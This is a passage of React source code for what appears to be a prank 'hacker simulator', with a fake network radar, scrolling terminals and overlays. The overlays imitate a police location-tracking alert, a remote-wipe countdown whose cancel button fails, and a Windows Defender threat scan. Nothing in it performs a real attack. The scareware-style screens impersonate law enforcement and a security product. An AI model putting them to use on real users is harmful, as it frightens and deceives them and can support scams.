  dist: number;
  ip: string;
  status: "SCANNING" | "HACKED" | "SECURE";
  bornAt: number;
  lastSweep: number;
  pulsePhase: number;
}

function generateFakeIP(): string {
  const subnets = ["192.168.1", "10.0.0", "172.16.0", "203.45.12", "85.203.44"];
  const sub = subnets[Math.floor(Math.random() * subnets.length)];
  return `${sub}.${Math.floor(Math.random() * 254) + 1}`;
}

function GraphicPanel() {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const nodesRef = useRef<RadarNode[]>([]);
  const sweepAngleRef = useRef<number>(0);
  const frameRef = useRef<number>(0);
  const nextIdRef = useRef<number>(0);
  const statsRef = useRef({ found: 0, compromised: 0, scanning: 0 });

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;

    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    const resize = () => {
      const parent = canvas.parentElement;
      if (!parent) return;
      canvas.width = parent.clientWidth;
      canvas.height = parent.clientHeight;
    };
    resize();
    const ro = new ResizeObserver(resize);
    ro.observe(canvas.parentElement!);

    const SWEEP_SPEED = 0.018;
    const NODE_LIMIT = 18;
    const NEON_GREEN = "oklch(0.85 0.22 145)";
    const NEON_AMBER = "oklch(0.85 0.18 75)";
    const NEON_RED = "oklch(0.65 0.22 25)";

    function hexColor(oklch: string): string {
      if (oklch.includes("145")) return "#00ff88";
      if (oklch.includes("75")) return "#ffb300";
      return "#ff3333";
    }

    const GREEN = hexColor(NEON_GREEN);
    const AMBER = hexColor(NEON_AMBER);
    const RED = hexColor(NEON_RED);

    function spawnNode(angle: number): void {
      if (nodesRef.current.length >= NODE_LIMIT) return;
      const dist = 0.15 + Math.random() * 0.78;
      const roll = Math.random();
      const status: RadarNode["status"] =
        roll < 0.5 ? "SCANNING" : roll < 0.85 ? "HACKED" : "SECURE";
      nodesRef.current.push({
        id: nextIdRef.current++,
        angle,
        dist,
        ip: generateFakeIP(),
        status,
        bornAt: performance.now(),
        lastSweep: performance.now(),
        pulsePhase: Math.random() * Math.PI * 2,
      });
      // Occasionally replace old nodes
      if (nodesRef.current.length > NODE_LIMIT) {
        nodesRef.current.splice(0, 1);
      }
    }

    let lastSpawnAngle = 0;

    function draw(now: number): void {
      if (!canvas || !ctx) return;
      const W = canvas.width;
      const H = canvas.height;
      if (W === 0 || H === 0) {
        frameRef.current = requestAnimationFrame(draw);
        return;
      }

      const cx = W / 2;
      const cy = H / 2;
      const R = Math.min(W, H) * 0.42;

      // Clear
      ctx.fillStyle = "#000a04";
      ctx.fillRect(0, 0, W, H);

      // ── Concentric rings ──
      for (let k = 1; k <= 4; k++) {
        const r = (R * k) / 4;
        ctx.beginPath();
        ctx.arc(cx, cy, r, 0, Math.PI * 2);
        ctx.strokeStyle = `rgba(0,255,136,${0.08 + k * 0.04})`;
        ctx.lineWidth = 0.7;
        ctx.stroke();
      }

      // ── Cross-hairs ──
      ctx.strokeStyle = "rgba(0,255,136,0.12)";
      ctx.lineWidth = 0.5;
      ctx.beginPath();
      ctx.moveTo(cx - R, cy);
      ctx.lineTo(cx + R, cy);
      ctx.stroke();
      ctx.beginPath();
      ctx.moveTo(cx, cy - R);
      ctx.lineTo(cx, cy + R);
      ctx.stroke();

      // Diagonal guides
      for (const ang of [Math.PI / 4, (3 * Math.PI) / 4]) {
        ctx.beginPath();
        ctx.moveTo(cx + Math.cos(ang) * R, cy + Math.sin(ang) * R);
        ctx.lineTo(cx - Math.cos(ang) * R, cy - Math.sin(ang) * R);
        ctx.stroke();
      }

      // ── Sweep trail (gradient arc) ──
      const sa = sweepAngleRef.current;
      const trailLen = Math.PI * 0.55;
      // conical gradient not used

      // Draw trail as many thin sectors
      const steps = 40;
      for (let s = 0; s < steps; s++) {
        const frac = s / steps;
        const alpha = frac * 0.35;
        const segStart = sa - trailLen * (1 - frac);
        const segEnd = sa - trailLen * (1 - (s + 1) / steps);
        ctx.beginPath();
        ctx.moveTo(cx, cy);
        ctx.arc(cx, cy, R, segStart, segEnd);
        ctx.closePath();
        ctx.fillStyle = `rgba(0,255,136,${alpha})`;
        ctx.fill();
      }

      // ── Sweep beam line ──
      ctx.beginPath();
      ctx.moveTo(cx, cy);
      ctx.lineTo(cx + Math.cos(sa) * R, cy + Math.sin(sa) * R);
      ctx.strokeStyle = "rgba(0,255,180,0.95)";
      ctx.lineWidth = 2;
      ctx.shadowBlur = 10;
      ctx.shadowColor = GREEN;
      ctx.stroke();
      ctx.shadowBlur = 0;

      // ── Spawn nodes when swept over ──
      const angleDiff = Math.abs(sa - lastSpawnAngle);
      if (angleDiff > 0.4 && Math.random() < 0.35) {
        spawnNode(sa + (Math.random() - 0.5) * 0.3);
        lastSpawnAngle = sa;
      }

      // ── Draw nodes ──
      let found = 0;
      let compromised = 0;
      let scanning = 0;
      for (const node of nodesRef.current) {
        const nx = cx + Math.cos(node.angle) * node.dist * R;
        const ny = cy + Math.sin(node.angle) * node.dist * R;
        const age = (now - node.bornAt) / 1000;
        const pulse = 0.5 + 0.5 * Math.sin(now * 0.005 + node.pulsePhase);

        let nodeColor = GREEN;
        if (node.status === "HACKED") {
          nodeColor = RED;
          compromised++;
        } else if (node.status === "SCANNING") {
          nodeColor = AMBER;
          scanning++;
        } else {
          nodeColor = GREEN;
        }
        found++;

        // Connection line from center
        if (node.status === "HACKED") {
          ctx.beginPath();
          ctx.moveTo(cx, cy);
          ctx.lineTo(nx, ny);
          ctx.strokeStyle = `rgba(255,51,51,${0.15 + pulse * 0.2})`;
          ctx.lineWidth = 0.8;
          ctx.setLineDash([3, 5]);
          ctx.stroke();
          ctx.setLineDash([]);
        }

        // Outer pulse ring
        const pulseR = 6 + pulse * 8;
        ctx.beginPath();
        ctx.arc(nx, ny, pulseR, 0, Math.PI * 2);
        ctx.strokeStyle = nodeColor
          .replace(")", `,${0.15 + pulse * 0.2})`)
          .replace("rgb(", "rgba(")
          .replace("rgb", "rgba")
          .replace("#", "rgba(")
          .replace("00ff88", "0,255,136")
          .replace("ffb300", "255,179,0")
          .replace("ff3333", "255,51,51");
        ctx.lineWidth = 0.7;
        // Use simple approach
        if (node.status === "HACKED")
          ctx.strokeStyle = `rgba(255,51,51,${0.15 + pulse * 0.25})`;
        else if (node.status === "SCANNING")
          ctx.strokeStyle = `rgba(255,179,0,${0.15 + pulse * 0.25})`;
        else ctx.strokeStyle = `rgba(0,255,136,${0.15 + pulse * 0.25})`;
        ctx.stroke();

        // Node dot
        const dotR = node.status === "HACKED" ? 4 : 3;
        ctx.beginPath();
        ctx.arc(nx, ny, dotR, 0, Math.PI * 2);
        if (node.status === "HACKED") ctx.fillStyle = RED;
        else if (node.status === "SCANNING") ctx.fillStyle = AMBER;
        else ctx.fillStyle = GREEN;
        ctx.shadowBlur = 8;
        ctx.shadowColor = nodeColor;
        ctx.fill();
        ctx.shadowBlur = 0;

        // IP label (fade in)
        const labelAlpha = Math.min(1, age * 1.5);
        ctx.font = "8px 'Courier New', monospace";
        ctx.fillStyle =
          node.status === "HACKED"
            ? `rgba(255,80,80,${labelAlpha})`
            : node.status === "SCANNING"
              ? `rgba(255,179,0,${labelAlpha})`
              : `rgba(0,255,136,${labelAlpha})`;
        const labelX = nx + 7;
        const labelY = ny - 4;
        ctx.fillText(node.ip, labelX, labelY);
        ctx.font = "7px 'Courier New', monospace";
        ctx.fillStyle =
          node.status === "HACKED"
            ? `rgba(255,100,100,${labelAlpha * 0.9})`
            : `rgba(255,200,0,${labelAlpha * 0.9})`;
        ctx.fillText(
          node.status === "HACKED"
            ? "● HACKED"
            : node.status === "SCANNING"
              ? "◌ SCANNING"
              : "✓ SECURE",
          labelX,
          labelY + 9,
        );
      }

      statsRef.current = { found, compromised, scanning };

      // ── Stats overlay (top-left) ──
      ctx.font = "bold 9px 'Courier New', monospace";
      const statsLines = [
        `TARGETS FOUND : ${found}`,
        `COMPROMISED   : ${compromised}`,
        `SCANNING      : ${scanning}`,
        `SECURE        : ${found - compromised - scanning}`,
      ];
      statsLines.forEach((line, idx) => {
        const y = 14 + idx * 13;
        const color =
          idx === 1
            ? "rgba(255,80,80,0.85)"
            : idx === 2
              ? "rgba(255,179,0,0.85)"
              : "rgba(0,255,136,0.7)";
        ctx.fillStyle = color;
        ctx.fillText(line, 8, y);
      });

      // ── Center dot ──
      ctx.beginPath();
      ctx.arc(cx, cy, 3, 0, Math.PI * 2);
      ctx.fillStyle = GREEN;
      ctx.shadowBlur = 12;
      ctx.shadowColor = GREEN;
      ctx.fill();
      ctx.shadowBlur = 0;

      // ── Degree ticks ──
      for (let deg = 0; deg < 360; deg += 30) {
        const rad = (deg * Math.PI) / 180;
        const inner = R - 5;
        const outer = R + 2;
        ctx.beginPath();
        ctx.moveTo(cx + Math.cos(rad) * inner, cy + Math.sin(rad) * inner);
        ctx.lineTo(cx + Math.cos(rad) * outer, cy + Math.sin(rad) * outer);
        ctx.strokeStyle = "rgba(0,255,136,0.4)";
        ctx.lineWidth = 1;
        ctx.stroke();
        // Degree label
        if (deg % 90 === 0) {
          ctx.font = "8px 'Courier New', monospace";
          ctx.fillStyle = "rgba(0,255,136,0.5)";
          ctx.fillText(
            `${deg}°`,
            cx + Math.cos(rad) * (R + 10) - 8,
            cy + Math.sin(rad) * (R + 10) + 3,
          );
        }
      }

      // ── Advance sweep ──
      sweepAngleRef.current =
        (sweepAngleRef.current + SWEEP_SPEED) % (Math.PI * 2);

      frameRef.current = requestAnimationFrame(draw);
    }

    frameRef.current = requestAnimationFrame(draw);

    return () => {
      cancelAnimationFrame(frameRef.current);
      ro.disconnect();
    };
  }, []);

  return (
    <div
      className="flex flex-col panel-bg neon-border panel-pulse"
      style={{ height: "100%", overflow: "hidden", position: "relative" }}
    >
      {/* Panel header */}
      <div
        style={{
          display: "flex",
          alignItems: "center",
          gap: "6px",
          padding: "4px 10px",
          borderBottom: "1px solid rgba(0,255,136,0.25)",
          flexShrink: 0,
        }}
      >
        <span
          style={{
            color: "var(--neon)",
            fontSize: "10px",
            fontWeight: "bold",
            letterSpacing: "1px",
          }}
        >
          [NETWORK RADAR]
        </span>
        <span
          style={{
            marginLeft: "auto",
            fontSize: "8px",
            color: "var(--amber)",
            animation: "blink 1s step-start infinite",
          }}
        >
          ● LIVE
        </span>
      </div>
      {/* Canvas fills remaining space */}
      <div style={{ flex: 1, position: "relative", overflow: "hidden" }}>
        <canvas
          ref={canvasRef}
          data-ocid="radar.canvas_target"
          style={{ display: "block", width: "100%", height: "100%" }}
        />
      </div>
    </div>
  );
}

// ─── TermPanel ────────────────────────────────────────────────────────────────

const MAX_LINES = 60;

function TermPanel({
  title,
  panelIndex,
  paused,
  injectLine,
}: {
  title: string;
  panelIndex: number;
  paused: boolean;
  injectLine: TermLine | null;
}) {
  const [lines, setLines] = useState<TermLine[]>(() =>
    Array.from({ length: 12 }, () => generateLine(panelIndex)),
  );
  const scrollRef = useRef<HTMLDivElement>(null);
  const pausedRef = useRef(paused);

  useEffect(() => {
    pausedRef.current = paused;
  }, [paused]);

  useEffect(() => {
    if (injectLine === null) return;
    setLines((prev) => {
      const next = [...prev, injectLine];
      return next.length > MAX_LINES
        ? next.slice(next.length - MAX_LINES)
        : next;
    });
    if (!pausedRef.current) {
      setTimeout(() => {
        if (scrollRef.current) {
          scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
        }
      }, 50);
    }
  }, [injectLine]);

  useEffect(() => {
    const delay = randInt(200, 800);
    const timer = setTimeout(() => {
      const interval = setInterval(
        () => {
          if (pausedRef.current) return;
          setLines((prev) => {
            const next = [...prev, generateLine(panelIndex)];
            return next.length > MAX_LINES
              ? next.slice(next.length - MAX_LINES)
              : next;
          });
          if (scrollRef.current) {
            scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
          }
        },
        randInt(120, 380),
      );
      return () => clearInterval(interval);
    }, delay);
    return () => clearTimeout(timer);
  }, [panelIndex]);

  return (
    <div
      className="flex flex-col panel-bg neon-border panel-pulse"
      style={{ height: "100%", overflow: "hidden" }}
    >
      <div
        className="flex items-center gap-2 px-2 py-1 shrink-0"
        style={{
          borderBottom: "1px solid oklch(0.85 0.22 145 / 0.5)",
          background: "oklch(0.06 0.01 145)",
        }}
      >
        <span
          className="neon-text text-xs font-bold tracking-widest"
          style={{ letterSpacing: "0.1em" }}
        >
          {title}
        </span>
        <span
          className="ml-auto text-xs"
          style={{ color: "oklch(0.56 0.03 145)", fontSize: "0.6rem" }}
        >
          PID:{randInt(1000, 9999)}
        </span>
        <span className="blink-cursor neon-text text-xs">▮</span>
      </div>
      <div
        ref={scrollRef}
        className="flex-1 px-2 py-1 term-scrollable"
        style={{
          overflowY: paused ? "auto" : "hidden",
          scrollBehavior: "smooth",
        }}
      >
        {lines.map((line) => (
          <div
            key={line.id}
            className="text-xs leading-tight py-px flex gap-1 flex-wrap"
            style={{ lineHeight: "1.3", fontSize: "0.65rem" }}
          >
            {line.type === "custom" ? (
              <span
                style={{
                  color: "oklch(0.95 0.18 75)",
                  fontWeight: "bold",
                  textShadow: "0 0 8px oklch(0.95 0.18 75 / 0.8)",
                }}
              >
                ▶ {line.text}
              </span>
            ) : line.type === "sys" ? (
              <span
                className="amber-text font-bold"
                style={{ textShadow: "0 0 6px oklch(0.80 0.18 75 / 0.7)" }}
              >
                ⚠ {line.text}
              </span>
            ) : line.type === "cmd" ? (
              <span style={{ color: "oklch(0.75 0.15 145)" }}>{line.text}</span>
            ) : line.type === "hex" ? (
              <span className="neon-text-dim" style={{ opacity: 0.8 }}>
                {line.text}
              </span>
            ) : (
              <>
                <span className="neon-text-dim">{line.text}</span>
                {line.status && (
                  <span className={STATUS_COLORS[line.status] ?? "neon-text"}>
                    {line.status}
                  </span>
                )}
              </>
            )}
          </div>
        ))}
      </div>
      <div className="scanline absolute inset-0 pointer-events-none" />
    </div>
  );
}

// ─── PoliceTrackingOverlay ────────────────────────────────────────────────────

function PoliceTrackingOverlay({ onClose }: { onClose: () => void }) {
  const [blink, setBlink] = React.useState(true);
  const [progress, setProgress] = React.useState(0);
  const [dotPos, setDotPos] = React.useState({ x: 50, y: 50 });
  const [lat, setLat] = React.useState(33.6844);
  const [lng, setLng] = React.useState(73.0479);
  const [phase, setPhase] = React.useState<"tracking" | "uploaded">("tracking");

  React.useEffect(() => {
    const blinkT = setInterval(() => setBlink((b) => !b), 500);
    return () => clearInterval(blinkT);
  }, []);

  React.useEffect(() => {
    const moveT = setInterval(() => {
      setDotPos((p) => ({
        x: Math.max(10, Math.min(90, p.x + (Math.random() - 0.5) * 3)),
        y: Math.max(10, Math.min(90, p.y + (Math.random() - 0.5) * 3)),
      }));
      setLat((v) =>
        Number.parseFloat((v + (Math.random() - 0.5) * 0.001).toFixed(4)),
      );
      setLng((v) =>
        Number.parseFloat((v + (Math.random() - 0.5) * 0.001).toFixed(4)),
      );
    }, 800);
    return () => clearInterval(moveT);
  }, []);

  React.useEffect(() => {
    const progT = setInterval(() => {
      setProgress((p) => {
        if (p >= 100) {
          clearInterval(progT);
          setPhase("uploaded");
          setTimeout(onClose, 3000);
          return 100;
        }
        return p + 1.2;
      });
    }, 80);
    return () => clearInterval(progT);
  }, [onClose]);

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      style={{
        position: "fixed",
        inset: 0,
        zIndex: 9998,
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        background: "rgba(0,0,0,0.88)",
        backdropFilter: "blur(4px)",
      }}
    >
      <motion.div
        initial={{ scale: 0.85, y: 40 }}
        animate={{ scale: 1, y: 0 }}
        exit={{ scale: 0.9, opacity: 0 }}
        transition={{ type: "spring", stiffness: 300, damping: 25 }}
        style={{
          width: "min(660px, 96vw)",
          background: "#0d0d0d",
          border: "2px solid #cc0000",
          borderRadius: 4,
          boxShadow: "0 0 40px rgba(200,0,0,0.4), 0 8px 40px rgba(0,0,0,0.9)",
          fontFamily: "Segoe UI, Arial, sans-serif",
          overflow: "hidden",
        }}
      >
        {/* Title bar */}
        <div
          style={{
            background: "#8b0000",
            padding: "6px 12px",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            borderBottom: "1px solid rgba(255,255,255,0.1)",
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <span style={{ fontSize: 14 }}>🚨</span>
            <span
              style={{
                color: "#fff",
                fontSize: 12,
                fontWeight: 700,
                letterSpacing: 1,
              }}
            >
              POLICE TRACKING SYSTEM — LAW ENFORCEMENT ACTIVE
            </span>
          </div>
          <div style={{ display: "flex", gap: 6 }}>
            {["─", "□", "✕"].map((sym, i) => (
              <div
                key={sym}
                style={{
                  width: 20,
                  height: 20,
                  background: i === 2 ? "#c42b1c" : "rgba(255,255,255,0.1)",
                  borderRadius: 2,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "#ccc",
                  fontSize: 10,
                  cursor: "default",
                }}
              >
                {sym}
              </div>
            ))}
          </div>
        </div>

        <div style={{ padding: "20px 24px 24px" }}>
          {phase === "tracking" ? (
            <>
              <div style={{ display: "flex", gap: 16, marginBottom: 16 }}>
                {/* Fake Map Grid */}
                <div
                  style={{
                    position: "relative",
                    width: 220,
                    height: 180,
                    background: "#0a1a0a",
                    border: "1px solid #1a3a1a",
                    borderRadius: 4,
                    flexShrink: 0,
                    overflow: "hidden",
                  }}
                >
                  {/* Grid lines */}
                  {[0, 1, 2, 3, 4].map((i) => (
                    <div
                      key={`h${i}`}
                      style={{
                        position: "absolute",
                        left: 0,
                        right: 0,
                        top: `${i * 25}%`,
                        borderTop: "1px solid rgba(0,255,0,0.1)",
                      }}
                    />
                  ))}
                  {[0, 1, 2, 3, 4].map((i) => (
                    <div
                      key={`v${i}`}
                      style={{
                        position: "absolute",
                        top: 0,
                        bottom: 0,
                        left: `${i * 25}%`,
                        borderLeft: "1px solid rgba(0,255,0,0.1)",
                      }}
                    />
                  ))}
                  {/* Scan line */}
                  <motion.div
                    animate={{ top: ["0%", "100%"] }}
                    transition={{
                      duration: 2,
                      repeat: Number.POSITIVE_INFINITY,
                      ease: "linear",
                    }}
                    style={{
                      position: "absolute",
                      left: 0,
                      right: 0,
                      height: 2,
                      background: "rgba(0,255,0,0.3)",
                    }}
                  />
                  {/* Blinking red dot */}
                  <motion.div
                    animate={{ opacity: blink ? 1 : 0 }}
                    style={{
                      position: "absolute",
                      left: `${dotPos.x}%`,
                      top: `${dotPos.y}%`,
                      transform: "translate(-50%,-50%)",
                    }}
                  >
                    <div
                      style={{
                        width: 12,
                        height: 12,
                        borderRadius: "50%",
                        background: "#ff0000",
                        boxShadow: "0 0 8px #ff0000, 0 0 16px #ff000080",
                      }}
                    />
                    <motion.div
                      animate={{ scale: [1, 2.5], opacity: [0.6, 0] }}
                      transition={{
                        duration: 1.2,
                        repeat: Number.POSITIVE_INFINITY,
                      }}
                      style={{
                        position: "absolute",
                        inset: -6,
                        borderRadius: "50%",
                        border: "2px solid #ff0000",
                      }}
                    />
                  </motion.div>
                  {/* Corner labels */}
                  <div
                    style={{
                      position: "absolute",
                      top: 4,
                      left: 6,
                      color: "#00ff0066",
                      fontSize: 8,
                      fontFamily: "monospace",
                    }}
                  >
                    ISL
                  </div>
                  <div
                    style={{
                      position: "absolute",
                      bottom: 4,
                      right: 6,
                      color: "#00ff0066",
                      fontSize: 8,
                      fontFamily: "monospace",
                    }}
                  >
                    PKT
                  </div>
                </div>

                {/* Info panel */}
                <div
                  style={{
                    flex: 1,
                    display: "flex",
                    flexDirection: "column",
                    gap: 8,
                  }}
                >
                  <div
                    style={{
                      color: blink ? "#ff3333" : "#cc0000",
                      fontWeight: 700,
                      fontSize: 15,
                      letterSpacing: 1,
                      transition: "color 0.3s",
                    }}
                  >
                    🔴 LOCATION ACQUIRED
                  </div>
                  <div style={{ color: "#888", fontSize: 11 }}>
                    TRACKING TARGET — DEVICE ID:{" "}
                    {`DEV-${Math.random().toString(16).slice(2, 10).toUpperCase()}`}
                  </div>
                  {[
                    ["LAT", `${lat.toFixed(4)}° N`],
                    ["LONG", `${lng.toFixed(4)}° E`],
                    ["CITY", "Rawalpindi, Punjab"],
                    ["ISP", "PTCL Broadband"],
                    ["IP", "119.153.42.87"],
                    ["STATUS", "UPLOADING TO AUTHORITIES"],
                  ].map(([k, v]) => (
                    <div
                      key={k}
                      style={{ display: "flex", gap: 8, fontSize: 11 }}
                    >
                      <span style={{ color: "#666", minWidth: 60 }}>{k}:</span>
                      <span
                        style={{
                          color: k === "STATUS" ? "#ff4444" : "#00cc44",
                          fontFamily: "monospace",
                          fontWeight: k === "STATUS" ? 700 : 400,
                        }}
                      >
                        {v}
                      </span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Progress bar */}
              <div style={{ marginBottom: 12 }}>
                <div
                  style={{
                    display: "flex",
                    justifyContent: "space-between",
                    marginBottom: 4,
                  }}
                >
                  <span style={{ color: "#aaa", fontSize: 11 }}>
                    UPLOADING LOCATION TO AUTHORITIES
                  </span>
                  <span
                    style={{ color: "#ff4444", fontSize: 11, fontWeight: 700 }}
                  >
                    {Math.round(progress)}%
                  </span>
                </div>
                <div
                  style={{
                    height: 6,
                    background: "#1a1a1a",
                    borderRadius: 3,
                    overflow: "hidden",
                  }}
                >
                  <motion.div
                    style={{
                      height: "100%",
                      background: "linear-gradient(90deg, #cc0000, #ff4444)",
                      borderRadius: 3,
                      width: `${progress}%`,
                    }}
                  />
                </div>
              </div>

              <div
                style={{
                  background: "#1a0000",
                  border: "1px solid #440000",
                  borderRadius: 4,
                  padding: "10px 14px",
                }}
              >
                <div
                  style={{ color: "#ff4444", fontSize: 12, fontWeight: 600 }}
                >
                  ⚠ Law enforcement has been notified. Do not close this window.
                </div>
                <div style={{ color: "#888", fontSize: 11, marginTop: 4 }}>
                  Your device location is being transmitted to the nearest
                  Cybercrime Unit.
                </div>
              </div>
            </>
          ) : (
            <motion.div
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              style={{ textAlign: "center", padding: "30px 0" }}
            >
              <div style={{ fontSize: 40, marginBottom: 12 }}>🚨</div>
              <div
                style={{
                  color: "#ff3333",
                  fontSize: 20,
                  fontWeight: 700,
                  letterSpacing: 2,
                  marginBottom: 8,
                }}
              >
                LOCATION TRANSMITTED
              </div>
              <div style={{ color: "#888", fontSize: 12 }}>
                Authorities have received your location data.
                <br />
                Case #PKT-{Math.floor(Math.random() * 900000 + 100000)} has been
                opened.
              </div>
            </motion.div>
          )}
        </div>
      </motion.div>
    </motion.div>
  );
}

// ─── CountdownOverlay ──────────────────────────────────────────────────────────

function CountdownOverlay({ onClose }: { onClose: () => void }) {
  const [seconds, setSeconds] = React.useState(60);
  const [phase, setPhase] = React.useState<
    "counting" | "denied" | "compromised"
  >("counting");
  const [blink, setBlink] = React.useState(true);

  React.useEffect(() => {
    const blinkT = setInterval(() => setBlink((b) => !b), 500);
    return () => clearInterval(blinkT);
  }, []);

  React.useEffect(() => {
    if (phase !== "counting") return;
    const t = setInterval(() => {
      setSeconds((s) => {
        if (s <= 1) {
          clearInterval(t);
          setPhase("compromised");
          setTimeout(onClose, 2500);
          return 0;
        }
        return s - 1;
      });
    }, 1000);
    return () => clearInterval(t);
  }, [phase, onClose]);

  const handleCancel = () => {
    setPhase("denied");
    setTimeout(onClose, 2000);
  };

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      style={{
        position: "fixed",
        inset: 0,
        zIndex: 9997,
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        background:
          phase === "denied"
            ? "rgba(120,0,0,0.95)"
            : phase === "compromised"
              ? "rgba(200,0,0,0.95)"
              : "rgba(0,0,0,0.92)",
        backdropFilter: "blur(6px)",
        transition: "background 0.3s",
      }}
    >
      <motion.div
        initial={{ scale: 0.8 }}
        animate={{ scale: 1 }}
        exit={{ scale: 0.9, opacity: 0 }}
        transition={{ type: "spring", stiffness: 280, damping: 22 }}
        style={{
          width: "min(520px, 94vw)",
          background: "#0a0000",
          border: "2px solid #cc0000",
          borderRadius: 6,
          boxShadow: "0 0 60px rgba(200,0,0,0.6), 0 0 120px rgba(200,0,0,0.2)",
          fontFamily: "'JetBrains Mono', monospace",
          textAlign: "center",
          padding: "40px 32px 36px",
          position: "relative",
          overflow: "hidden",
        }}
      >
        {/* Background pulse */}
        <motion.div
          animate={{ opacity: [0.03, 0.08, 0.03] }}
          transition={{ duration: 1, repeat: Number.POSITIVE_INFINITY }}
          style={{
            position: "absolute",
            inset: 0,
            background: "#ff0000",
            pointerEvents: "none",
          }}
        />

        {phase === "counting" && (
          <>
            <div
              style={{
                color: blink ? "#ff4444" : "#cc2222",
                fontSize: 14,
                fontWeight: 700,
                letterSpacing: 3,
                marginBottom: 24,
                transition: "color 0.3s",
              }}
            >
              ⚠ SYSTEM BREACH DETECTED ⚠
            </div>
            <div
              style={{
                color: "#888",
                fontSize: 12,
                letterSpacing: 2,
                marginBottom: 12,
              }}
            >
              INITIATING REMOTE WIPE IN:
            </div>
            <motion.div
              animate={{ scale: blink ? 1 : 0.97 }}
              transition={{ duration: 0.5 }}
              style={{
                fontSize: "clamp(72px, 18vw, 100px)",
                fontWeight: 900,
                color: seconds <= 10 ? "#ff2222" : "#ff4444",
                lineHeight: 1,
                letterSpacing: 4,
                textShadow: "0 0 30px rgba(255,50,50,0.8)",
                marginBottom: 20,
                fontVariantNumeric: "tabular-nums",
              }}
            >
              {mm}:{ss}
            </motion.div>
            <div
              style={{
                color: "#666",
                fontSize: 11,
                letterSpacing: 1,
                marginBottom: 28,
              }}
            >
              All files will be encrypted and transmitted to remote server
            </div>
            <button
              type="button"
              onClick={handleCancel}
              data-ocid="countdown.cancel_button"
              style={{
                background: "transparent",
                border: "1px solid #444",
                color: "#666",
                padding: "8px 24px",
                fontSize: 11,
                letterSpacing: 2,
                cursor: "pointer",
                borderRadius: 3,
                fontFamily: "'JetBrains Mono', monospace",
              }}
            >
              CANCEL WIPE
            </button>
          </>
        )}

        {phase === "denied" && (
          <motion.div
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
          >
            <div style={{ fontSize: 40, marginBottom: 16 }}>🔒</div>
            <div
              style={{
                color: "#ff3333",
                fontSize: 22,
                fontWeight: 700,
                letterSpacing: 3,
              }}
            >
              ACCESS DENIED
            </div>
            <div style={{ color: "#888", fontSize: 12, marginTop: 10 }}>
              Cancellation request blocked by remote administrator
            </div>
          </motion.div>
        )}

        {phase === "compromised" && (
          <motion.div
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
          >
            <div style={{ fontSize: 40, marginBottom: 16 }}>💀</div>
            <div
              style={{
                color: "#ff2222",
                fontSize: 22,
                fontWeight: 700,
                letterSpacing: 3,
              }}
            >
              SYSTEM COMPROMISED
            </div>
            <div style={{ color: "#888", fontSize: 12, marginTop: 10 }}>
              Remote wipe initiated. All data has been transmitted.
            </div>
          </motion.div>
        )}
      </motion.div>
    </motion.div>
  );
}

// ─── VirusScanOverlay ─────────────────────────────────────────────────────────

function VirusScanOverlay({
  phase,
  progress,
  files,
  threatCount,
  filesScanned,
  onClose,
}: {
  phase: "scanning" | "results";
  progress: number;
  files: string[];
  threatCount: number;
  filesScanned: number;
  onClose: () => void;
}) {
  const [blink, setBlink] = React.useState(true);
  React.useEffect(() => {
    const t = setInterval(() => setBlink((b) => !b), 600);
    return () => clearInterval(t);
  }, []);

  const threats = [
    {
      level: "🔴 CRITICAL",
      name: "Trojan.Stealer.BankInfo",
      path: "C:\\Users\\Admin\\AppData\\Roaming\\BankVault\\data.bin",
    },
    {
      level: "🔴 CRITICAL",
      name: "Spyware.KeyLogger.Pro",
      path: "C:\\Windows\\Temp\\kl32_svc.exe",
    },
    {
      level: "🟡 WARNING",
      name: "Adware.Browser.Hijack",
      path: "C:\\Program Files\\SearchProtect\\bin\\CltMngSvc.exe",
    },
    {
      level: "🔴 CRITICAL",
      name: "Ransomware.WannaCry.Variant",
      path: "C:\\Users\\Admin\\Documents\\@WannaDecryptor.exe",
    },
  ];

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      style={{
        position: "fixed",
        inset: 0,
        zIndex: 9999,
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        background: "rgba(0,0,0,0.85)",
        backdropFilter: "blur(4px)",
      }}
    >
      <motion.div
        initial={{ scale: 0.85, y: 40 }}
        animate={{ scale: 1, y: 0 }}
        exit={{ scale: 0.9, opacity: 0 }}
        transition={{ type: "spring", stiffness: 300, damping: 25 }}
        style={{
          width: "min(680px, 96vw)",
          background: "#1a1a2e",
          border: "1px solid #444",
          borderRadius: 4,
          boxShadow:
            "0 8px 40px rgba(0,0,0,0.9), 0 0 0 1px rgba(255,255,255,0.06)",
          fontFamily: "Segoe UI, Arial, sans-serif",
          overflow: "hidden",
        }}
      >
        {/* Title bar */}
        <div
          style={{
            background: phase === "results" ? "#8b0000" : "#1e3a5f",
            padding: "6px 12px",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            borderBottom: "1px solid rgba(255,255,255,0.1)",
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <span style={{ fontSize: 14 }}>🛡️</span>
            <span style={{ color: "#e0e0e0", fontSize: 12, fontWeight: 600 }}>
              Windows Defender — Threat Protection
            </span>
          </div>
          <div style={{ display: "flex", gap: 6 }}>
            {["─", "□", "✕"].map((sym, i) => (
              <div
                key={sym}
                style={{
                  width: 20,
                  height: 20,
